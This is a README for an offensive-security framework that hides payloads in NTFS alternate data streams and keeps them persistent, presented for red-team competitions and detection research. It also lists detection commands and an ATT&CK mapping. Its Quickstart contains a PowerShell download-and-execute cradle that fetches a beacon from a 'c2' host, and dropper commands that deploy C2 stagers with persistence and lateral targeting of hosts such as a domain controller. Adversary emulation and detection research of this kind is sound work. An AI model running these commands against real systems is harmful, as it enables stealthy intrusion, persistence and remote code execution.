#### README.md
# Apparition Delivery System
```
. : .  .  .. ... ...... ..................... ...... ... .. .  . : .
: .   .       .       .        .        .        .        .   . . :
.       _    ___   ___   _     ___    ___ _____  _   ___  _  _       .
       /_\   | _ \| _ \ /_\   | __ \ |_ _|_   _|| | / _ \| \| |
      / _ \  |  _/|  _// _ \  | |/ /  | |  | |  | || (_) | .` |
     /_/ \_\ |_|  |_/ /_/ \_\_|_|\_| |___| |_|  |_| \___/|_|\_|
: .    . .   . . ..  . .. . . .. . .. .. . .. ... . .. .    . . :
.   .  .     . :     .    :  . : :   . : :    . :      .    .   .
   .   :      '  Apparition Delivery System (ADS) '      :    .
 .  .  .   . . ' " Execution without presence " ' .    .   .  .
    . .      . .. .. . ... .................. .. . .. .      . .
```

## Purpose
ADS (Apparition Delivery System) is a research framework for exploring stealthy 
Windows execution techniques using filesystem artifacts that exist, execute, 
and persist outside traditional visibility.

**Primary Use Cases:**
1. Red Team: CCDC-style persistence testing (authorized environments only)
2. Blue Team: Understanding ADS detection gaps and telemetry
3. Research: Novel NTFS hiding techniques and their forensic visibility

## Ethical Guidelines
✅ Authorized penetration testing with explicit permission
✅ CCDC competition (adversary emulation)
✅ Security research and detection development
❌ Unauthorized access to systems
❌ Malicious use

## Architecture
```
[Payload] → [Storage] → [Loader] → [Trigger]
```

**Storage Backends:**
| Type           | Visibility | Stability        | Use Case                     |
|----------------|------------|------------------|------------------------------|
| Classic ADS    | Medium     | High             | Production red team          |
| Volume Root    | Low        | High             | Enumeration evasion research |
| NTFS Internal* | Very Low   | **Experimental** | Research only                |

# *NTFS Internal streams (e.g., $LOGGED_UTILITY_STREAM) are **unstable** and may cause filesystem corruption. Use only in disposable VMs.

## Detection & Defense
This tool intentionally creates artifacts to help blue teams understand detection:

**What Defender Will See:**
- Scheduled task creation (Event ID 4698)
- Wscript.exe spawning PowerShell (Sysmon Event ID 1)
- ADS access (if stream hash monitoring enabled)

**How to Detect:**
```powershell
# Find all ADS in ProgramData
Get-ChildItem C:\ProgramData -Recurse | Get-Item -Stream * | Where-Object Stream -ne ':$DATA'

# Check for suspicious tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Windows*" -and $_.Author -eq ""}
```

## MITRE ATT&CK Mapping
- T1564.004: Hide Artifacts - NTFS File Attributes
- T1053.005: Scheduled Task/Job
- T1059.001: PowerShell

## 🚀 Quickstart

```powershell
# Imix (Realm C2)
$imixB64 = "VGhpcyBpcyBteSBJTX14IHN0YWdlci4uLg=="
.\src\ADS-Dropper.ps1 -Payload $imixB64 -Persist task -Randomize -Encrypt

# Metasploit beacon
$msf = "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')"
.\src\ADS-Dropper.ps1 -Payload $msf -Persist volroot,reg

# Sliver + lateral
.\src\ADS-Dropper.ps1 -Payload @('sliver_stager.ps1') -Targets @('dc01','web01')
```
## Full CLI
```powershell
.\src\ADS-Dropper.ps1 -Payload $payload -Targets @('localhost','dc01') -Persist task,volroot -Randomize -Encrypt -NoExec
```
